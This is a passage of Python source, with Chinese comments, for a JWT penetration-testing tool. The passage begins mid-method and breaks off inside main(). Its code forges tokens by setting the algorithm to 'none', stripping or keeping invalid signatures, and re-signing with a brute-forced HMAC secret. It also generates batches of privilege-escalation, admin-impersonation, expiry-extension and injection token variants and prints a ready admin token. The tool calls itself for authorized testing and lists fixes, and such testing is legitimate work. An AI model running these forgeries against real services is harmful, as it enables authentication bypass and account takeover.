        sign_choice = input("请选择 (1-4): ").strip()
        
        if sign_choice == '1':
            modifications['header']['alg'] = 'none'
            modifications['signing'] = {'method': 'none'}
        elif sign_choice == '2':
            secret = input("输入签名密钥: ").strip()
            algorithm = input("输入算法 (默认HS256): ").strip() or 'HS256'
            modifications['signing'] = {'method': 'secret', 'secret': secret, 'algorithm': algorithm}
        elif sign_choice == '3':
            modifications['signing'] = {'method': 'keep_original'}
        else:  # sign_choice == '4' or default
            modifications['signing'] = {'method': 'unsigned_keep_algorithm'}
        
        # 执行修改
        result = self.apply_modifications(token, modifications)
        
        if 'error' in result:
            print(f"\n❌ 修改失败: {result['error']}")
            return {}
        
        print("\n✅ 修改完成!")
        print("=" * 80)
        
        # 显示详细对比
        print("\n📋 Header 修改对比:")
        print(f"  修改前: {json.dumps(result['original_header'], indent=2)}")
        print(f"  修改后: {json.dumps(result['modified_header'], indent=2)}")
        
        print("\n📦 Payload 修改对比:")
        print(f"  修改前: {json.dumps(result['original_payload'], indent=2)}")
        print(f"  修改后: {json.dumps(result['modified_payload'], indent=2)}")
        
        print(f"\n🎯 Token 对比:")
        print(f"  原始Token: {result['original_token']}")
        print(f"  新Token:   {result['new_token']}")
        
        print(f"\n🔍 PWD结构解析:")
        original_parts = result['original_token'].split('.')
        new_parts = result['new_token'].split('.')
        
        print(f"  原始结构: Header.Payload.Signature")
        print(f"           {original_parts[0][:20]}...({len(original_parts[0])})")
        print(f"           {original_parts[1][:20]}...({len(original_parts[1])})")
        print(f"           {original_parts[2][:20]}...({len(original_parts[2])})")
        
        print(f"  新的结构: Header.Payload.Signature")
        print(f"           {new_parts[0][:20]}...({len(new_parts[0])})")
        print(f"           {new_parts[1][:20]}...({len(new_parts[1])})")
        print(f"           {new_parts[2][:20]}...({len(new_parts[2])})")
        
        print(f"\n🔐 签名信息:")
        print(f"  签名方式: {result.get('signature_method', 'unknown')}")
        if 'secret_used' in result:
            print(f"  使用密钥: {result['secret_used']}")
        if 'warning' in result:
            print(f"  ⚠️  警告: {result['warning']}")
        
        return result
    
    def apply_modifications(self, token: str, modifications: Dict) -> Dict:
        """应用修改并生成新JWT"""
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return {'error': decoded['error']}
        
        original_header = decoded.get('header', {}).get('json', {})
        original_payload = decoded.get('payload', {}).get('json', {})
        
        # 应用Header修改
        new_header = original_header.copy()
        for key, value in modifications.get('header', {}).items():
            if value == '__DELETE__':
                new_header.pop(key, None)
            else:
                new_header[key] = value
        
        # 应用Payload修改
        new_payload = original_payload.copy()
        for key, value in modifications.get('payload', {}).items():
            if value == '__DELETE__':
                new_payload.pop(key, None)
            else:
                new_payload[key] = value
        
        result = {
            'original_token': token,
            'original_header': original_header,
            'original_payload': original_payload,
            'modified_header': new_header,
            'modified_payload': new_payload,
            'modifications_applied': modifications
        }
        
        # 生成新Token
        signing_config = modifications.get('signing', {'method': 'none'})
        
        if signing_config['method'] == 'none':
            new_header['alg'] = 'none'
            result['new_token'] = self.create_unsigned_jwt(new_header, new_payload)
            result['signature_method'] = 'none'
            
        elif signing_config['method'] == 'secret':
            secret = signing_config.get('secret', '')
            algorithm = signing_config.get('algorithm', 'HS256')
            new_header['alg'] = algorithm
            
            try:
                result['new_token'] = self.create_signed_jwt(new_header, new_payload, secret, algorithm)
                result['signature_method'] = f'signed_with_{algorithm}'
                result['secret_used'] = secret
            except Exception as e:
                result['error'] = f"签名失败: {str(e)}"
                result['new_token'] = self.create_unsigned_jwt(new_header, new_payload)
                result['signature_method'] = 'fallback_to_none'
        
        elif signing_config['method'] == 'unsigned_keep_algorithm':
            # 保持原算法但移除签名
            result['new_token'] = self.create_unsigned_jwt(new_header, new_payload)
            result['signature_method'] = 'unsigned_keep_algorithm'
            result['warning'] = '保持原算法但移除了签名'
        
        else:  # keep_original
            # 保持原算法和签名，但内容已修改，签名会失效
            original_parts = token.split('.')
            if len(original_parts) == 3:
                # 重新编码header和payload，保持原签名
                new_header_b64 = base64.urlsafe_b64encode(
                    json.dumps(new_header, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                new_payload_b64 = base64.urlsafe_b64encode(
                    json.dumps(new_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                result['new_token'] = f"{new_header_b64}.{new_payload_b64}.{original_parts[2]}"
                result['signature_method'] = 'original_signature_kept'
                result['warning'] = '内容已修改但保持原签名，此Token签名验证将失败'
            else:
                result['new_token'] = self.create_unsigned_jwt(new_header, new_payload)
                result['signature_method'] = 'fallback_to_none'
                result['warning'] = '无法保持原签名，已生成无签名Token'
        
        return result
    
    def convert_value_type(self, value: str) -> Any:
        """智能类型转换"""
        value = value.strip()
        
        # Boolean
        if value.lower() == 'true':
            return True
        elif value.lower() == 'false':
            return False
        
        # Null
        elif value.lower() in ['null', 'none', '']:
            return None
        
        # Integer
        elif value.isdigit() or (value.startswith('-') and value[1:].isdigit()):
            return int(value)
        
        # Float
        elif '.' in value:
            try:
                return float(value)
            except ValueError:
                pass
        
        # Array (简单解析)
        elif value.startswith('[') and value.endswith(']'):
            try:
                return json.loads(value)
            except:
                pass
        
        # Object (简单解析)
        elif value.startswith('{') and value.endswith('}'):
            try:
                return json.loads(value)
            except:
                pass
        
        # String (默认)
        return value
    
    def parse_relative_time(self, relative_str: str) -> Optional[int]:
        """解析相对时间"""
        try:
            pattern = r'([+-]?)(\d+)([dhms])'
            match = re.match(pattern, relative_str.lower())
            
            if not match:
                return None
            
            sign, amount, unit = match.groups()
            amount = int(amount)
            
            if sign == '-':
                amount = -amount
            
            now = int(time.time())
            
            if unit == 'd':
                return now + (amount * 86400)
            elif unit == 'h':
                return now + (amount * 3600)
            elif unit == 'm':
                return now + (amount * 60)
            elif unit == 's':
                return now + amount
            
        except:
            pass
        
        return None
    
    def create_unsigned_jwt(self, header: Dict, payload: Dict) -> str:
        """创建无签名JWT"""
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}."
    
    def create_signed_jwt(self, header: Dict, payload: Dict, secret: str, algorithm: str = 'HS256') -> str:
        """创建签名JWT"""
        if algorithm.upper() not in self.algorithms:
            raise ValueError(f"不支持的算法: {algorithm}")
        
        header['alg'] = algorithm.upper()
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        message = f"{header_b64}.{payload_b64}"
        hash_func = self.algorithms[algorithm.upper()]
        
        signature = hmac.new(
            secret.encode('utf-8'),
            message.encode('utf-8'),
            hash_func
        ).digest()
        
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{header_b64}.{payload_b64}.{signature_b64}"
    
    def batch_modify(self, token: str, modification_list: List[Dict]) -> List[Dict]:
        """批量修改JWT"""
        results = []
        
        for i, modifications in enumerate(modification_list, 1):
            print(f"[*] 处理修改 {i}/{len(modification_list)}...")
            result = self.apply_modifications(token, modifications)
            
            if 'error' not in result:
                result['batch_index'] = i
                results.append(result)
            else:
                print(f"[-] 修改 {i} 失败: {result['error']}")
        
        return results
    
    def generate_attack_suite(self, token: str) -> Dict:
        """生成完整攻击套件"""
        print("[+] 生成攻击套件...")
        
        attack_suite = {
            'algorithm_attacks': [],
            'privilege_escalation': [],
            'injection_attacks': [],
            'time_manipulation': [],
            'user_impersonation': [],
            'signature_bypass': []
        }
        
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            return {'error': decoded['error']}
        
        header = decoded.get('header', {}).get('json', {})
        payload = decoded.get('payload', {}).get('json', {})
        
        # 算法攻击
        algorithm_variants = ['none', 'None', 'NONE', 'null', 'NULL', '']
        for alg in algorithm_variants:
            modifications = {
                'header': {'alg': alg},
                'signing': {'method': 'none'}
            }
            attack_suite['algorithm_attacks'].append(modifications)
        
        # 权限提升攻击
        privilege_escalations = [
            {'admin': True},
            {'admin': 'true'},
            {'admin': 1},
            {'role': 'admin'},
            {'role': 'administrator'},
            {'role': 'root'},
            {'is_admin': True},
            {'user_type': 'admin'},
            {'authority': 'admin'},
            {'permission': 'admin'},
            {'level': 'admin'}
        ]
        
        for escalation in privilege_escalations:
            modifications = {
                'header': {'alg': 'none'},
                'payload': escalation,
                'signing': {'method': 'none'}
            }
            attack_suite['privilege_escalation'].append(modifications)
        
        # 用户身份伪造
        if payload:
            user_fields = ['user', 'username', 'sub', 'user_id', 'uid', 'id']
            admin_users = ['admin', 'administrator', 'root', 'superuser', 0, 1]
            
            for field in user_fields:
                if field in payload:
                    for admin_user in admin_users:
                        modifications = {
                            'header': {'alg': 'none'},
                            'payload': {field: admin_user},
                            'signing': {'method': 'none'}
                        }
                        attack_suite['user_impersonation'].append(modifications)
        
        # 时间操纵
        now = int(time.time())
        time_attacks = [
            {'exp': now + 86400 * 365},  # 一年后过期
            {'exp': 9999999999},         # 远未来
            {'iat': now},                # 当前签发时间
            {'nbf': now - 86400}         # 一天前生效
        ]
        
        for time_attack in time_attacks:
            modifications = {
                'header': {'alg': 'none'},
                'payload': time_attack,
                'signing': {'method': 'none'}
            }
            attack_suite['time_manipulation'].append(modifications)
        
        # 注入攻击
        if payload:
            string_fields = [k for k, v in payload.items() if isinstance(v, str)]
            for field in string_fields[:3]:  # 限制数量
                for category, payloads in self.attack_payloads.items():
                    for payload_text in payloads[:2]:  # 每类取前2个
                        modifications = {
                            'header': {'alg': 'none'},
                            'payload': {field: payload_text},
                            'signing': {'method': 'none'}
                        }
                        attack_suite['injection_attacks'].append(modifications)
        
        return attack_suite
    
    def save_results(self, results: Any, filename: str, format_type: str = 'json'):
        """保存结果到文件"""
        try:
            if format_type.lower() == 'json':
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(results, f, indent=2, ensure_ascii=False, default=str)
            
            elif format_type.lower() == 'txt':
                with open(filename, 'w', encoding='utf-8') as f:
                    if isinstance(results, dict) and 'new_token' in results:
                        # 单个修改结果
                        f.write("JWT修改结果\n")
                        f.write("=" * 80 + "\n\n")
                        f.write(f"原始Token: {results['original_token']}\n")
                        f.write(f"新Token: {results['new_token']}\n\n")
                        f.write(f"原始Header: {json.dumps(results['original_header'], indent=2)}\n")
                        f.write(f"修改后Header: {json.dumps(results['modified_header'], indent=2)}\n\n")
                        f.write(f"原始Payload: {json.dumps(results['original_payload'], indent=2)}\n")
                        f.write(f"修改后Payload: {json.dumps(results['modified_payload'], indent=2)}\n\n")
                        f.write(f"签名方式: {results.get('signature_method', 'unknown')}\n")
                    
                    elif isinstance(results, list):
                        # 批量结果
                        f.write("JWT批量修改结果\n")
                        f.write("=" * 80 + "\n\n")
                        for i, result in enumerate(results, 1):
                            f.write(f"变种 {i}:\n")
                            f.write("-" * 40 + "\n")
                            f.write(f"Token: {result.get('new_token', 'N/A')}\n")
                            f.write(f"Header: {json.dumps(result.get('modified_header', {}))}\n")
                            f.write(f"Payload: {json.dumps(result.get('modified_payload', {}))}\n\n")
                    
                    else:
                        # 通用格式
                        f.write(str(results))
            
            print(f"[+] 结果已保存到: {filename}")
            
        except Exception as e:
            print(f"[-] 保存文件失败: {e}")
    
    def print_detailed_analysis(self, token: str):
        """打印详细分析结果"""
        print("\n" + "="*100)
        print("🔍 JWT 详细安全分析报告")
        print("="*100)
        
        # 基础解码
        decoded = self.decode_jwt(token)
        if 'error' in decoded:
            print(f"❌ 错误: {decoded['error']}")
            return
        
        # 结构解析
        structure = self.parse_structure(token)
        
        print(f"\n📋 TOKEN 信息:")
        print("-" * 50)
        print(f"原始Token: {token[:80]}{'...' if len(token) > 80 else ''}")
        print(f"Token长度: {len(token)} 字符")
        print(f"估算安全级别: {structure['structure_analysis']['estimated_security_level']}")
        
        # Header 分析
        print(f"\n🔧 HEADER 分析:")
        print("-" * 50)
        for param, info in structure['header_parameters'].items():
            print(f"📌 {param}: {info['value']} ({info['type']})")
            print(f"   描述: {info['description']}")
            print(f"   安全影响: {info['security_impact']}")
            if info['modification_targets']:
                print(f"   修改建议: {len(info['modification_targets'])} 个目标可用")
        
        # Payload 分析
        print(f"\n📦 PAYLOAD 分析:")
        print("-" * 50)
        for param, info in structure['payload_parameters'].items():
            value_display = info['value']
            if 'human_readable' in info:
                value_display = f"{info['value']} ({info['human_readable']})"
            
            print(f"📌 {param}: {value_display} ({info['type']})")
            print(f"   描述: {info['description']}")
            print(f"   安全影响: {info['security_impact']}")
            
            if 'time_analysis' in info:
                print(f"   时间分析: {info['time_analysis']}")
            
            if info['modification_targets']:
                print(f"   修改建议: {len(info['modification_targets'])} 个目标可用")
        
        # 漏洞扫描
        print(f"\n🛡️ 安全漏洞扫描:")
        print("-" * 50)
        vulns = self.comprehensive_vulnerability_scan(token)
        
        for severity in ['critical', 'high', 'medium', 'low', 'info']:
            if vulns[severity]:
                severity_emoji = {
                    'critical': '🚨',
                    'high': '⚠️',
                    'medium': '⚡',
                    'low': 'ℹ️',
                    'info': '💡'
                }
                
                print(f"\n{severity_emoji[severity]} {severity.upper()} 级别漏洞 ({len(vulns[severity])} 个):")
                for vuln in vulns[severity]:
                    print(f"   • {vuln['title']}")
                    print(f"     {vuln['description']}")
                    if 'impact' in vuln:
                        print(f"     影响: {vuln['impact']}")
                    if 'recommendation' in vuln:
                        print(f"     建议: {vuln['recommendation']}")
                    print()
    
    def run_automated_test_suite(self, token: str, output_dir: str = None):
        """运行自动化测试套件"""
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        print("\n" + "="*80)
        print("🤖 自动化JWT渗透测试套件")
        print("="*80)
        
        # 1. 基础分析
        print("\n[1/6] 基础安全分析...")
        self.print_detailed_analysis(token)
        
        # 2. 密钥破解
        print("\n[2/6] 密钥破解测试...")
        secret = self.advanced_crack_secret(token, max_length=8, num_threads=4)
        if secret:
            print(f"[+] 发现密钥: {secret}")
        
        # 3. 生成攻击套件
        print("\n[3/6] 生成攻击载荷...")
        attack_suite = self.generate_attack_suite(token)
        if 'error' not in attack_suite:
            total_attacks = sum(len(attacks) for attacks in attack_suite.values())
            print(f"[+] 生成 {total_attacks} 个攻击载荷")
        
        # 4. 执行批量修改
        print("\n[4/6] 执行攻击载荷...")
        all_modifications = []
        for category, modifications in attack_suite.items():
            all_modifications.extend(modifications)
        
        if all_modifications:
            results = self.batch_modify(token, all_modifications[:50])  # 限制数量
            print(f"[+] 成功生成 {len(results)} 个变种Token")
        else:
            results = []
        
        # 5. 保存结果
        print("\n[5/6] 保存测试结果...")
        timestamp = int(time.time())
        
        if output_dir:
            # 保存详细分析
            analysis_file = os.path.join(output_dir, f"jwt_analysis_{timestamp}.json")
            analysis_data = {
                'original_token': token,
                'structure_analysis': self.parse_structure(token),
                'vulnerability_scan': self.comprehensive_vulnerability_scan(token),
                'secret_found': secret,
                'timestamp': timestamp
            }
            self.save_results(analysis_data, analysis_file, 'json')
            
            # 保存攻击结果
            if results:
                results_file = os.path.join(output_dir, f"jwt_attacks_{timestamp}.txt")
                self.save_results(results, results_file, 'txt')
                
                tokens_file = os.path.join(output_dir, f"jwt_tokens_{timestamp}.txt")
                with open(tokens_file, 'w') as f:
                    for result in results:
                        f.write(f"{result.get('new_token', '')}\n")
                print(f"[+] Token列表保存到: {tokens_file}")
        
        # 6. 生成测试报告
        print("\n[6/6] 生成测试报告...")
        self.generate_test_report(token, secret, attack_suite, results, output_dir)
        
        print(f"\n✅ 自动化测试完成!")
        if output_dir:
            print(f"📁 结果保存在: {output_dir}")
    
    def generate_test_report(self, token: str, secret: Optional[str], attack_suite: Dict, results: List[Dict], output_dir: str = None):
        """生成测试报告"""
        report = []
        report.append("JWT 渗透测试报告")
        report.append("=" * 80)
        report.append(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"目标Token: {token[:50]}...")
        report.append("")
        
        # 执行摘要
        report.append("📊 执行摘要")
        report.append("-" * 40)
        
        structure = self.parse_structure(token)
        security_level = structure['structure_analysis']['estimated_security_level']
        report.append(f"安全级别: {security_level}")
        
        if secret:
            report.append(f"密钥破解: ✅ 成功 (密钥: {secret})")
        else:
            report.append("密钥破解: ❌ 失败")
        
        if 'error' not in attack_suite:
            total_attacks = sum(len(attacks) for attacks in attack_suite.values())
            report.append(f"攻击载荷: {total_attacks} 个")
        
        report.append(f"成功变种: {len(results)} 个")
        report.append("")
        
        # 漏洞发现
        vulns = self.comprehensive_vulnerability_scan(token)
        report.append("🛡️ 发现的漏洞")
        report.append("-" * 40)
        
        for severity in ['critical', 'high', 'medium', 'low']:
            if vulns[severity]:
                report.append(f"{severity.upper()} 级别: {len(vulns[severity])} 个")
                for vuln in vulns[severity]:
                    report.append(f"  • {vuln['title']}")
        report.append("")
        
        # 攻击建议
        report.append("⚔️ 攻击建议")
        report.append("-" * 40)
        
        if secret:
            report.append("1. 密钥已破解，可以伪造任意JWT")
            report.append(f"   使用密钥 '{secret}' 签名新的JWT")
        
        if any('ALGORITHM_NONE' in str(vuln) for vuln in vulns['critical']):
            report.append("2. 算法设置为none，可以绕过签名验证")
            report.append("   直接修改JWT内容无需签名")
        
        privilege_fields = []
        for param, info in structure['payload_parameters'].items():
            if 'admin' in info['security_impact'].lower() or '权限' in info['security_impact']:
                privilege_fields.append(param)
        
        if privilege_fields:
            report.append("3. 发现权限控制字段，可尝试权限提升")
            report.append(f"   目标字段: {', '.join(privilege_fields)}")
        
        report.append("")
        
        # 修复建议
        report.append("🔧 修复建议")
        report.append("-" * 40)
        report.append("1. 使用强密钥或非对称算法 (RS256, ES256)")
        report.append("2. 确保正确验证JWT签名")
        report.append("3. 不要在JWT中存储敏感信息")
        report.append("4. 实现合理的过期时间")
        report.append("5. 在服务端重新验证权限，不要仅依赖JWT声明")
        report.append("")
        
        # 技术细节
        if results:
            report.append("🔍 生成的攻击Token (前10个)")
            report.append("-" * 40)
            for i, result in enumerate(results[:10], 1):
                report.append(f"{i}. {result.get('new_token', 'N/A')}")
            report.append("")
        
        # 保存报告
        report_text = '\n'.join(report)
        print(report_text)
        
        if output_dir:
            timestamp = int(time.time())
            report_file = os.path.join(output_dir, f"jwt_report_{timestamp}.txt")
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(report_text)
            print(f"\n📄 详细报告保存到: {report_file}")


def main():
    parser = argparse.ArgumentParser(
        description='JWT专业渗透测试工具 - 用于授权安全测试',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 基础解码分析
  %(prog)s "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..."
  
  # 详细分析
  %(prog)s token.txt --analyze
  
  # 交互式修改
  %(prog)s token.txt --modify
  
  # 快速修改参数
  %(prog)s token.txt --set-payload "admin=true,role=admin" --algorithm none
  
  # 密钥破解
  %(prog)s token.txt --crack --wordlist passwords.txt --threads 8
  
  # 自动化测试套件
  %(prog)s token.txt --auto-test --output results/
  
  # 批量处理
  %(prog)s --file tokens.txt --batch-modify --output results/
        '''
    )
    
    # 输入参数
    input_group = parser.add_mutually_exclusive_group()
    input_group.add_argument('token', nargs='?', help='JWT token字符串')
    input_group.add_argument('-f', '--file', help='包含JWT token的文件')
    input_group.add_argument('--stdin', action='store_true', help='从标准输入读取token')
    
    # 分析选项
    parser.add_argument('-a', '--analyze', action='store_true', help='详细安全分析')
    parser.add_argument('--structure', action='store_true', help='解析JWT结构')
    parser.add_argument('--vulnerabilities', action='store_true', help='漏洞扫描')
    
    # 修改选项
    parser.add_argument('-m', '--modify', action='store_true', help='交互式修改JWT')
    parser.add_argument('--set-header', help='设置header字段 (格式: key1=value1,key2=value2)')
    parser.add_argument('--set-payload', help='设置payload字段 (格式: key1=value1,key2=value2)')
    parser.add_argument('--algorithm', help='设置算法 (none, HS256, HS384, HS512)')
    parser.add_argument('--secret', help='签名密钥')
    
    # 破解选项
    parser.add_argument('-c', '--crack', action='store_true', help='破解JWT密钥')
    parser.add_argument('-w', '--wordlist', action='append', help='密钥字典文件 (可多次使用)')
    parser.add_argument('--max-length', type=int, default=12, help='暴力破解最大长度 (默认12)')
    parser.add_argument('--threads', type=int, default=4, help='破解线程数 (默认4)')
    
    # 批量操作
    parser.add_argument('--batch-modify', action='store_true', help='批量生成攻击变种')
    parser.add_argument('--auto-test', action='store_true', help='运行自动化测试套件')
    
    # PWD结构显示
    parser.add_argument('--show-structure', action='store_true', help='详细显示PWD结构')
    parser.add_argument('--base64-decode', action='store_true', help='显示Base64解码内容')
    parser.add_argument('-o', '--output', help='输出目录或文件')
    parser.add_argument('--format', choices=['json', 'txt'], default='txt', help='输出格式')
    parser.add_argument('--quiet', action='store_true', help='静默模式')
    parser.add_argument('--save-tokens', action='store_true', help='保存生成的token到文件')
    
    args = parser.parse_args()
    
    # 创建工具实例
    jwt_tool = JWTPenetrationTool()
    
    # 获取输入token
    tokens = []
    
    if args.token:
        tokens.append(args.token)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                tokens = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] 文件未找到: {args.file}")
            return 1
        except Exception as e:
            print(f"[-] 读取文件失败: {e}")
            return 1
    elif args.stdin:
        for line in sys.stdin:
            token = line.strip()
            if token:
                tokens.append(token)
    else:
        # 交互模式
        print("JWT渗透测试工具 - 交互模式")
        print("输入JWT token (或输入文件路径，以@开头):")
        
        user_input = input("> ").strip()
        if user_input.startswith('@'):
            # 文件路径
            filepath = user_input[1:]
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    tokens = [line.strip() for line in f if line.strip()]
            except Exception as e:
                print(f"[-] 读取文件失败: {e}")
                return 1
        else:
            tokens.append(user_input)
    
    if not tokens:
        print("[-] 未提供JWT token")
        return 1
    
    # 处理每个token
    for i, token in enumerate(tokens):
        if len(tokens) > 1:
            print(f"\n{'='*60}")
            print(f"处理Token {i+1}/{len(tokens)}")
            print('='*60)
        
        if not jwt_tool.is_jwt(token):
            print(f"[-] 无效的JWT格式: {token[:50]}...")
            continue
        
        # 根据参数执行相应操作
        if args.auto_test:
            # 自动化测试套件
            output_dir = args.output if args.output else f"jwt_test_results_{int(time.time())}"
            jwt_tool.run_automated_test_suite(token, output_dir)
        
        elif args.modify:
            # 交互式修改
            result = jwt_tool.modify_jwt_interactive(token)
            if result and args.output:
                jwt_tool.save_results(result, args.output, args.format)
        
        elif args.set_header or args.set_payload or args.algorithm:
            # 命令行快速修改
            modifications = {'header': {}, 'payload': {}}
            
            # 解析header修改
            if args.set_header:
                for item in args.set_header.split(','):
                    if '=' in item:
                        key, value = item.split('=', 1)
                        modifications['header'][key.strip()] = jwt_tool.convert_value_type(value.strip())
            
            # 解析payload修改
            if args.set_payload:
                for item in args.set_payload.split(','):
                    if '=' in item:
                        key, value = item.split('=', 1)
                        modifications['payload'][key.strip()] = jwt_tool.convert_value_type(value.strip())
            
            # 设置算法
            if args.algorithm:
                modifications['header']['alg'] = args.algorithm
                if args.algorithm.lower() == 'none':
                    modifications['signing'] = {'method': 'none'}
                elif args.secret:
                    modifications['signing'] = {'method': 'secret', 'secret': args.secret, 'algorithm': args.algorithm}
                else:
                    modifications['signing'] = {'method': 'none'}
            elif args.secret:
                modifications['signing'] = {'method': 'secret', 'secret': args.secret, 'algorithm': 'HS256'}
            else:
                modifications['signing'] = {'method': 'none'}
            
            # 执行修改
            result = jwt_tool.apply_modifications(token, modifications)
            
            if 'error' in result:
                print(f"[-] 修改失败: {result['error']}")
            else:
                if not args.quiet:
                    print(f"\n✅ JWT修改成功!")
                    print("=" * 80)
                    
                    # 显示修改对比
                    print(f"\n📋 Header 修改对比:")
                    print(f"  修改前: {json.dumps(result['original_header'], separators=(',', ':'))}")
                    print(f"  修改后: {json.dumps(result['modified_header'], separators=(',', ':'))}")
                    
                    print(f"\n📦 Payload 修改对比:")
                    print(f"  修改前: {json.dumps(result['original_payload'], separators=(',', ':'))}")
                    print(f"  修改后: {json.dumps(result['modified_payload'], separators=(',', ':'))}")
                    
                    print(f"\n🎯 生成的Token:")
                    print(f"  原始Token: {result['original_token']}")
                    print(f"  新Token:   {result['new_token']}")
                    
                    print(f"\n🔍 PWD结构对比:")
                    original_parts = result['original_token'].split('.')
                    new_parts = result['new_token'].split('.')
                    print(f"  原始: {len(original_parts[0])}.{len(original_parts[1])}.{len(original_parts[2])} (字符数)")
                    print(f"  新的: {len(new_parts[0])}.{len(new_parts[1])}.{len(new_parts[2])} (字符数)")
                    
                    print(f"\n🔐 签名方式: {result.get('signature_method', 'unknown')}")
                    if 'secret_used' in result:
                        print(f"🔑 使用密钥: {result['secret_used']}")
                
                if args.output:
                    jwt_tool.save_results(result, args.output, args.format)
        
        elif args.batch_modify:
            # 批量生成攻击变种
            attack_suite = jwt_tool.generate_attack_suite(token)
            if 'error' not in attack_suite:
                all_modifications = []
                for category, modifications in attack_suite.items():
                    all_modifications.extend(modifications)
                
                results = jwt_tool.batch_modify(token, all_modifications)
                
                if not args.quiet:
                    print(f"[+] 生成 {len(results)} 个攻击变种")
                
                if args.output:
                    jwt_tool.save_results(results, args.output, args.format)
                    
                    if args.save_tokens:
                        tokens_file = f"{args.output}_tokens.txt"
                        with open(tokens_file, 'w') as f:
                            for result in results:
                                f.write(f"{result.get('new_token', '')}\n")
                        print(f"[+] Token列表保存到: {tokens_file}")
        
        elif args.crack:
            # 密钥破解
            wordlists = args.wordlist if args.wordlist else []
            secret = jwt_tool.advanced_crack_secret(
                token, 
                wordlists=wordlists,
                max_length=args.max_length,
                num_threads=args.threads
            )
            
            if secret and not args.quiet:
                print(f"[+] 密钥破解成功: '{secret}'")
                
                # 演示使用破解的密钥创建新JWT
                decoded = jwt_tool.decode_jwt(token)
                payload = decoded.get('payload', {}).get('json', {})
                if payload:
                    # 创建admin版本
                    admin_payload = payload.copy()
                    admin_payload.update({'admin': True, 'role': 'admin'})
                    
                    header = decoded.get('header', {}).get('json', {})
                    algorithm = header.get('alg', 'HS256')
                    
                    try:
                        admin_jwt = jwt_tool.create_signed_jwt({}, admin_payload, secret, algorithm)
                        print(f"[+] 使用破解密钥生成的admin JWT:")
                        print(f"Token: {admin_jwt}")
                    except Exception as e:
                        print(f"[-] 生成新JWT失败: {e}")
        
        elif args.show_structure or args.base64_decode:
            # PWD结构详细显示
            decoded = jwt_tool.decode_jwt(token)
            if 'error' in decoded:
                print(f"[-] 错误: {decoded['error']}")
                continue
            
            print("\n" + "="*80)
            print("🔍 JWT PWD结构详细分析")
            print("="*80)
            
            parts = decoded['parts']
            print(f"\n📊 结构概览:")
            print(f"  完整Token: {token}")
            print(f"  Token长度: {len(token)} 字符")
            print(f"  结构: Header.Payload.Signature")
            print(f"  长度: {len(parts['header'])}.{len(parts['payload'])}.{len(parts['signature'])}")
            
            # Header详细分析
            print(f"\n📋 Header 部分:")
            print(f"  Base64编码: {parts['header']}")
            print(f"  编码长度: {len(parts['header'])} 字符")
            if args.base64_decode:
                header_decoded = jwt_tool.decode_base64_url(parts['header'])
                print(f"  解码内容: {header_decoded}")
                try:
                    header_json = json.loads(header_decoded)
                    print(f"  JSON解析:")
                    for key, value in header_json.items():
                        print(f"    {key}: {value} ({type(value).__name__})")
                except:
                    print(f"  JSON解析: 失败")
            
            # Payload详细分析
            print(f"\n📦 Payload 部分:")
            print(f"  Base64编码: {parts['payload']}")
            print(f"  编码长度: {len(parts['payload'])} 字符")
            if args.base64_decode:
                payload_decoded = jwt_tool.decode_base64_url(parts['payload'])
                print(f"  解码内容: {payload_decoded}")
                try:
                    payload_json = json.loads(payload_decoded)
                    print(f"  JSON解析:")
                    for key, value in payload_json.items():
                        if key in ['exp', 'iat', 'nbf'] and isinstance(value, int):
                            try:
                                dt = datetime.fromtimestamp(value)
                                print(f"    {key}: {value} ({type(value).__name__}) -> {dt.strftime('%Y-%m-%d %H:%M:%S')}")
                            except:
                                print(f"    {key}: {value} ({type(value).__name__})")
                        else:
                            print(f"    {key}: {value} ({type(value).__name__})")
                except:
                    print(f"  JSON解析: 失败")
            
            # Signature详细分析
            print(f"\n🔐 Signature 部分:")
            print(f"  Base64编码: {parts['signature']}")
            print(f"  编码长度: {len(parts['signature'])} 字符")
            print(f"  是否为空: {'是' if len(parts['signature']) == 0 else '否'}")
            if parts['signature'] and args.base64_decode:
                try:
                    sig_decoded = base64.urlsafe_b64decode(parts['signature'] + '==')
                    print(f"  解码字节数: {len(sig_decoded)} bytes")
                    print(f"  十六进制: {sig_decoded.hex()}")
                except:
                    print(f"  解码: 失败")
            
            # 修改建议
            structure_analysis = jwt_tool.parse_structure(token)
            print(f"\n💡 修改建议:")
            header_params = structure_analysis.get('header_parameters', {})
            payload_params = structure_analysis.get('payload_parameters', {})
            
            if header_params:
                print(f"  Header字段 ({len(header_params)}个):")
                for param, info in header_params.items():
                    targets = len(info.get('modification_targets', []))
                    print(f"    {param}: {info['value']} -> {targets} 个修改目标")
            
            if payload_params:
                print(f"  Payload字段 ({len(payload_params)}个):")
                for param, info in payload_params.items():
                    targets = len(info.get('modification_targets', []))
                    print(f"    {param}: {info['value']} -> {targets} 个修改目标")
        
        elif args.analyze or args.structure or args.vulnerabilities:
            # 详细分析
            if args.analyze:
                jwt_tool.print_detailed_analysis(token)
            elif args.structure:
                structure = jwt_tool.parse_structure(token)
                print(json.dumps(structure, indent=2, ensure_ascii=False))
            elif args.vulnerabilities:
                vulns = jwt_tool.comprehensive_vulnerability_scan(token)
                print(json.dumps(vulns, indent=2, ensure_ascii=False))
        
        else:
            # 默认：基础解码
